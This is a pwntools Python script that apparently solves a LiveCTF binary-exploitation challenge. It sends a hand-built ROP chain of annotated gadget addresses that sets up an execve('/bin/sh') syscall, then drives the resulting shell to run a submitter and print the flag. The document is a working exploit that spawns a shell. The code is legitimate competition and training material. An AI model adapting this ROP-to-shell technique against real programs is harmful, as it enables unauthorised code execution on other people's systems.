import argparse
import sys

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'
context.arch='amd64'


PATH = "/solve/handout/challenge"
# LIBC = "/handout/libc.so.6"
# LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    # r = process(PATH)
    r = gdb.debug(PATH, f'''
file {PATH}
c
''')
    
# filter
# (addr&0xf < 0xa) and ((addr>>4)&0xf < 0xa) and ((addr>>8)&0xf < 0xa) and ((addr>>12)&0xf < 0xa) and ((addr>>16)&0xf < 0xa) and ((addr>>20)&0xf < 0xa) and ((addr>>24)&0xf < 0xa)

# /bin/sh at 004a04f9
# 00420471
# 00080088

chain = [
    0x00001000, # garbage nonzero
    0x00001000, # garbage nonzero
    0x00001000, # garbage nonzero
    0x400000000, # upper 4 bytes are the loop index
# rcx = 3b
    0x00404782, # xor eax, eax ; retn 
    0x00402218, # pop rdi ; pop rbp ; retn 
    0x38,
    0x1,
    0x00471886, # add eax, edi ; retn 
    0x00402218, # pop rdi ; pop rbp ; retn 
    0x3,
    0x1,
    0x00471886, # add eax, edi ; retn 
    0x00477648, # xchg ecx, eax ; sub eax, edx ; retn 

# rdi = /bin/sh

  # esi = /bin/sh & ~88888888
  # {
    0x00404782, # xor eax, eax ; retn 
    0x00402218, # pop rdi ; pop rbp ; retn 
    0x00420471,
    0x1,
    0x00471886, # add eax, edi ; retn 
    0x00436488, # xchg esi, eax ; retn 
  # }

  # edi = /bin/sh & 88888888
  # {
    # eax = (writable)
    # {
    0x00404782, # xor eax, eax ; retn 
    0x00402218, # pop rdi ; pop rbp ; retn 
    0x00445630,
    0x1,
    0x00471886, # add eax, edi ; retn 
    0x00402218, # pop rdi ; pop rbp ; retn 
    0x00088800,
    0x1,
    0x00471886, # add eax, edi ; retn 
    # }
    0x00402218, # pop rdi ; pop rbp ; retn 
    0x00080088,
    0x1,
    0x00493933, # or edi, esi ; add eax, dword [rax] ; retn 
  # }

# rsi = 0
    0x00404782, # xor eax, eax ; retn 
    0x00436488, # xchg esi, eax ; retn 
# rax = rcx = 3b
    0x00477648, # xchg ecx, eax ; sub eax, edx ; retn 
# rdx was already 0
# syscall
    0x00401311, # syscall 
    0, # go
]

for ch in chain:
    r.sendlineafter(b"Addr pls:", f"{ch:x}".encode())

r.sendline(b"./submitter")
r.sendline(b'./submitter')
r.sendline(b'./submitter')
r.sendline(b'./submitter')

flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)